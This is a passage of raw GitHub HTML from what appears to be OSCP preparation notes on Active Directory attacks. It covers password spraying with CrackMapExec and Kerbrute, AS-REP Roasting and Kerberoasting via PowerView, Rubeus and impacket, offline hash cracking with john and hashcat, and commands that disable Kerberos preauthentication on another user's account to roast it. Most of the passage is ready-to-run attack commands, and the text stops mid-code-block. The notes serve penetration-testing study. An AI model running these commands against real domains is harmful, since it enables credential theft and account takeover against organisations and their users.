aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# check account policy's password lockout threshold\nnet accounts\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e check account policy's password lockout threshold\u003c/span\u003e\nnet accounts\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eSee the simple \u003ca href=\"/camercu/oscp-prep/blob/main/tools/win/Spray-Passwords.ps1\"\u003e\u003ccode\u003eSpray-Passwords.ps1\u003c/code\u003e\u003c/a\u003e script, which is based on an expansion of this idea:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"$pdc=[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner;\n$dn=([adsi]'').distinguishedName\n$p=(\u0026quot;LDAP://\u0026quot;+$pdc.Name+\u0026quot;/\u0026quot;+$dn);\n$d=New-Object System.DirectoryServices.DirectoryEntry($p,\u0026quot;USERNAME\u0026quot;,\u0026quot;PASSWORD\u0026quot;)\"\u003e\u003cpre\u003e\u003cspan class=\"pl-smi\"\u003e$pdc\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e[\u003cspan class=\"pl-k\"\u003eSystem.DirectoryServices.ActiveDirectory.Domain\u003c/span\u003e]::GetCurrentDomain().PdcRoleOwner;\n\u003cspan class=\"pl-smi\"\u003e$dn\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e([\u003cspan class=\"pl-k\"\u003eadsi\u003c/span\u003e]\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e).distinguishedName\n\u003cspan class=\"pl-smi\"\u003e$p\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e(\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eLDAP://\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003e\u003cspan class=\"pl-smi\"\u003e$pdc\u003cspan class=\"pl-smi\"\u003e.Name\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e/\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003e\u003cspan class=\"pl-smi\"\u003e$dn\u003c/span\u003e);\n\u003cspan class=\"pl-smi\"\u003e$d\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003eNew-Object\u003c/span\u003e System.DirectoryServices.DirectoryEntry(\u003cspan class=\"pl-smi\"\u003e$p\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eUSERNAME\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003ePASSWORD\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e)\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eUse the script like so:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\".\\Spray-Passwords.ps1 -Admin -Pass \u0026quot;PASSWORD\u0026quot;\"\u003e\u003cpre\u003e.\\Spray\u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ePasswords.ps1 \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eAdmin \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ePass \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003ePASSWORD\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eAlternatively, use \u003cstrong\u003eCrackMapExec\u003c/strong\u003e, which has bonus of showing whether user is Admin on target by adding \u003ccode\u003ePwn3d!\u003c/code\u003e to output. NOTE: CME does not throttle requests, so watch out for account lockout.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# check list of usernames against single host\ncrackmapexec smb -u users.txt -p 'PASSWORD' --continue-on-success -d DOMAIN VICTIM_IP\n\n# (assuming you know password) check which machines user(s) can access and has admin on.\n# For admin, look for '(Pwn3d!)'\ncrackmapexec smb -u USERNAME -p 'PASSWORD' --continue-on-success -d DOMAIN CIDR_OR_RANGE\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e check list of usernames against single host\u003c/span\u003e\ncrackmapexec smb -u users.txt -p \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003ePASSWORD\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e --continue-on-success -d DOMAIN VICTIM_IP\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e (assuming you know password) check which machines user(s) can access and has admin on.\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e For admin, look for '(Pwn3d!)'\u003c/span\u003e\ncrackmapexec smb -u USERNAME -p \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003ePASSWORD\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e --continue-on-success -d DOMAIN CIDR_OR_RANGE\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eAnother option is \u003cstrong\u003eKerbrute\u003c/strong\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# fetch kerbrute\nwget -O kerbrute32.exe https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_windows_386.exe\nwget -O kerbrute64.ese https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_windows_amd64.exe\nwget -O kerbrute https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64\nchmod +x kerbrute\n\n# on linux\n./kerbrute passwordspray -d DOMAIN ./usernames.txt 'PASSWORD' --dc DOMAIN_IP\n\n# on windows\n.\\kerbrute64.exe passwordspray -d DOMAIN .\\usernames.txt \u0026quot;PASSWORD\u0026quot;\n# if you receive a network error, make sure that the encoding of usernames.txt is ANSI.\n# You can use Notepad's Save As functionality to change the encoding.\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e fetch kerbrute\u003c/span\u003e\nwget -O kerbrute32.exe https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_windows_386.exe\nwget -O kerbrute64.ese https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_windows_amd64.exe\nwget -O kerbrute https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64\nchmod +x kerbrute\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e on linux\u003c/span\u003e\n./kerbrute passwordspray -d DOMAIN ./usernames.txt \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003ePASSWORD\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e --dc DOMAIN_IP\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e on windows\u003c/span\u003e\n.\u003cspan class=\"pl-cce\"\u003e\\k\u003c/span\u003eerbrute64.exe passwordspray -d DOMAIN .\u003cspan class=\"pl-cce\"\u003e\\u\u003c/span\u003esernames.txt \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003ePASSWORD\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e if you receive a network error, make sure that the encoding of usernames.txt is ANSI.\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e You can use Notepad's Save As functionality to change the encoding.\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e5.2.3 AS-REP Roasting\u003c/h3\u003e\u003ca id=\"user-content-523-as-rep-roasting\" class=\"anchor\" aria-label=\"Permalink: 5.2.3 AS-REP Roasting\" href=\"#523-as-rep-roasting\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eAS-REP Roasting is an attack to retrieve a user's password hash that can be brute-forced offline.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eNormally when requesting a TGT, a client must prove its identity by encrypting the timestamp with it's hashed password in the AS-REQ. This is known as \u003cem\u003eKerberos Preauthentication\u003c/em\u003e. However, some services require turning preauthentication off (by enabling the \u003cem\u003eDo not require Kerberos preauthentication (i.e. DONT_REQ_PREAUTH)\u003c/em\u003e option) in order to function. This means that they (or any attacker) can request a TGT without submitting an encrypted timestamp, and the server will respond with a properly-encrypted TGT. Because the session key contains an HMAC encrypted with the user's hash, we can brute force this offline. Under the hood, the attack also weakens the crypto by requesting RC4 as the only allowable cipher for the HMAC (vs. the default of AES256-CTS).\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eEnumerating for users that are AS-REP Roastable:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# Windows: using PowerView\nGet-DomainUser -PreauthNotRequired | select samaccountname\n\n# Microsoft standard way of looking for users with \n# \u0026quot;Do not require Kerberos Preauthentication\u0026quot; option set (hex 0x400000 = 4194304)\n# requires ActiveDirectory module to be loaded\nGet-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | fl\n\n# Kali: using impacket (specify user info for authentication to DC)\nimpacket-GetNPUsers -dc-ip DC_IP DOMAIN/USERNAME:PASSWORD\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Windows: using PowerView\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eGet-DomainUser\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ePreauthNotRequired \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e select samaccountname\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Microsoft standard way of looking for users with \u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e \"Do not require Kerberos Preauthentication\" option set (hex 0x400000 = 4194304)\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e requires ActiveDirectory module to be loaded\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eGet-ADUser\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eFilter \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003euseraccountcontrol -band 4194304\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eProperties useraccountcontrol \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e fl\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Kali: using impacket (specify user info for authentication to DC)\u003c/span\u003e\nimpacket\u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eGetNPUsers \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003edc\u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eip DC_IP DOMAIN\u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eUSERNAME:PASSWORD\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eCollecting hashes using AS-REP Roast attack:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# Windows: use Rubeus.exe (can use /format:hashcat interchangably)\n.\\Rubeus.exe asreproast /format:john /outfile:asreproast.hash\n# push to stdout instead of file\n.\\Rubeus.exe asreproast /nowrap\n\n# Kali: using crackmapexec, automatically finds all AS-REP Roastable users \u0026amp; grabs hashes\ncrackmapexec ldap VICTIM -u USERNAME -p PASSWORD --asreproast asreproast.hash\n\n# Kali: use impacket (specify user info for authentication to DC)\nimpacket-GetNPUsers -request -outputfile asreproast.hash -dc-ip DC_IP DOMAIN/USERNAME:PASSWORD\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Windows: use Rubeus.exe (can use /format:hashcat interchangably)\u003c/span\u003e\n.\\\u003cspan class=\"pl-c1\"\u003eRubeus.exe\u003c/span\u003e asreproast \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eformat:john \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eoutfile:asreproast.hash\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e push to stdout instead of file\u003c/span\u003e\n.\\\u003cspan class=\"pl-c1\"\u003eRubeus.exe\u003c/span\u003e asreproast \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003enowrap\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Kali: using crackmapexec, automatically finds all AS-REP Roastable users \u0026amp; grabs hashes\u003c/span\u003e\ncrackmapexec ldap VICTIM \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eu USERNAME \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ep PASSWORD \u003cspan class=\"pl-k\"\u003e--\u003c/span\u003easreproast asreproast.hash\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Kali: use impacket (specify user info for authentication to DC)\u003c/span\u003e\nimpacket\u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eGetNPUsers \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003erequest \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eoutputfile asreproast.hash \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003edc\u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eip DC_IP DOMAIN\u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eUSERNAME:PASSWORD\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eCracking the AS-REP roast hashes:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# using John-the-Ripper (auto-detects krb5asrep format)\njohn --wordlist=/usr/share/wordlists/rockyou.txt asreproast.hash\n\n# using hashcat\nhashcat -m 18200 --force -r /usr/share/hashcat/rules/best64.rule asreproast.hash /usr/share/wordlists/rockyou.txt\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e using John-the-Ripper (auto-detects krb5asrep format)\u003c/span\u003e\njohn --wordlist=/usr/share/wordlists/rockyou.txt asreproast.hash\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e using hashcat\u003c/span\u003e\nhashcat -m 18200 --force -r /usr/share/hashcat/rules/best64.rule asreproast.hash /usr/share/wordlists/rockyou.txt\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eIf you have write permissions for another user account (e.g. \u003ccode\u003eGenericAll\u003c/code\u003e), then, instead of changing their password, you could momentarily set their account to disable Preauth, allowing you to AS-REP roast their account. Here's how:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# using Microsoft ActiveDirectory Module\nget-aduser -identity $USERNAME | Set-ADAccountControl -doesnotrequirepreauth $true\n\n# using AD Provider\n$flag = (Get-ItemProperty -Path \u0026quot;AD:\\$DISTINGUISHED_NAME\u0026quot; -Name useraccountcontrol).useraccountcontrol -bor 0x400000\nSet-ItemProperty -Path \u0026quot;AD:\\$DISTINGUISHED_NAME\u0026quot; -Name useraccountcontrol -Value \u0026quot;$flag\u0026quot; -Confirm:$false\n\n# using ADSI accelerator (legacy, may not work for cloud-based servers)\n$user = [adsi]\u0026quot;LDAP://$DISTINGUISHED_NAME\u0026quot;\n$flag = $user.userAccountControl.value -bor 0x400000\n$user.userAccountControl = $flag\n$user.SetInfo()\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e using Microsoft ActiveDirectory Module\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eget-aduser\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eidentity \u003cspan class=\"pl-smi\"\u003e$USERNAME\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eSet-ADAccountControl\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003edoesnotrequirepreauth \u003cspan class=\"pl-c1\"\u003e$true\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e using AD Provider\u003c/span\u003e\n\u003cspan class=\"pl-smi\"\u003e$flag\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e (\u003cspan class=\"pl-c1\"\u003eGet-ItemProperty\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ePath \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eAD:\\\u003cspan class=\"pl-smi\"\u003e$DISTINGUISHED_NAME\u003c/span\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eName useraccountcontrol).useraccountcontrol \u003cspan class=\"pl-k\"\u003e-bor\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e0x400000\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eSet-ItemProperty\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ePath \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eAD:\\\u003cspan class=\"pl-smi\"\u003e$DISTINGUISHED_NAME\u003c/span\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eName useraccountcontrol \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eValue \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003cspan class=\"pl-smi\"\u003e$flag\u003c/span\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eConfirm:\u003cspan class=\"pl-c1\"\u003e$false\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e using ADSI accelerator (legacy, may not work for cloud-based servers)\u003c/span\u003e\n\u003cspan class=\"pl-smi\"\u003e$user\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e [\u003cspan class=\"pl-k\"\u003eadsi\u003c/span\u003e]\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eLDAP://\u003cspan class=\"pl-smi\"\u003e$DISTINGUISHED_NAME\u003c/span\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"pl-smi\"\u003e$flag\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003e$user\u003cspan class=\"pl-smi\"\u003e.userAccountControl.value\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-bor\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e0x400000\u003c/span\u003e\n\u003cspan class=\"pl-smi\"\u003e$user\u003cspan class=\"pl-smi\"\u003e.userAccountControl\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003e$flag\u003c/span\u003e\n\u003cspan class=\"pl-smi\"\u003e$user\u003cspan class=\"pl-smi\"\u003e.SetInfo\u003c/span\u003e\u003c/span\u003e()\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e5.2.4 Kerberoasting\u003c/h3\u003e\u003ca id=\"user-content-524-kerberoasting\" class=\"anchor\" aria-label=\"Permalink: 5.2.4 Kerberoasting\" href=\"#524-kerberoasting\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eKerberoasting is an attack to retrieve the password hash of a Service Principal Name (SPN) that can be brute-forced offline.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eWhen requesting the service ticket from the KDC, no checks are performed to confirm whether the user has any permissions to access the service hosted by the SPN. These checks are performed only when connecting to the service itself. This means that if we know the SPN we want to target, we can request a service ticket for it from the domain controller. The service ticket's HMAC is encrypted using the SPN's password hash. If we are able to request the ticket and decrypt the HMAC using brute force or guessing, we can use this information to crack the cleartext password of the service account. This is known as Kerberoasting. It is very similar to AS-REP Roasting, except it is attacking SPNs' hashes instead of users'.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eObtaining the SPN Hashes:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# Windows: using PowerView.ps1\nInvoke-Kerberoast | fl\n\n# Windows: using Rubeus\n# '/tgtdeleg' tries to downgrade encryption to RC4\n.\\Rubeus.exe kerberoast /tgtdeleg /outfile:kerberoast.hash\n\n# Kali: use crackmapexec, auto-finds all kerberoastable users \u0026amp; grabs hashes\ncrackmapexec ldap VICTIM_IP -u harry -p pass --kerberoasting kerberoast.hash\n\n# Kali: use impacket\nimpacket-GetUserSPNs -request -outputfile kerberoast.hash -dc-ip DC_IP DOMAIN/USERNAME:PASSWORD\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Windows: using PowerView.ps1\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eInvoke-Kerberoast\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e fl\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Windows: using Rubeus\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e '/tgtdeleg' tries to downgrade encryption to RC4\u003c/span\u003e\n.\\\u003cspan class=\"pl-c1\"\u003eRubeus.exe\u003c/span\u003e kerberoast \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003etgtdeleg \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eoutfile:kerberoast.hash\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Kali: use crackmapexec, auto-finds all kerberoastable users \u0026amp; grabs hashes\u003c/span\u003e\ncrackmapexec ldap VICTIM_IP \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eu harry \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ep pass \u003cspan class=\"pl-k\"\u003e--\u003c/span\u003ekerberoasting kerberoast.hash\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Kali: use impacket\u003c/span\u003e\nimpacket\u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eGetUserSPNs \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003erequest \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eoutputfile kerberoast.hash \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003edc\u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eip DC_IP DOMAIN\u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eUSERNAME:PASSWORD\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eCracking the kerberoast hashes:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# using John-the-Ripper (auto-detects krb5tgs format)\njohn --wordlist=/usr/share/wordlists/rockyou.txt kerberoast.hash\n\n# using hashcat\nhashcat -m 13100 --force -r /usr/share/hashcat/rules/best64.rule kerberoast.hash /usr/share/wordlists/rockyou.txt\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e using John-the-Ripper (auto-detects krb5tgs format)\u003c/span\u003e\njohn --wordlist=/usr/share/wordlists/rockyou.txt kerberoast.hash\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e using 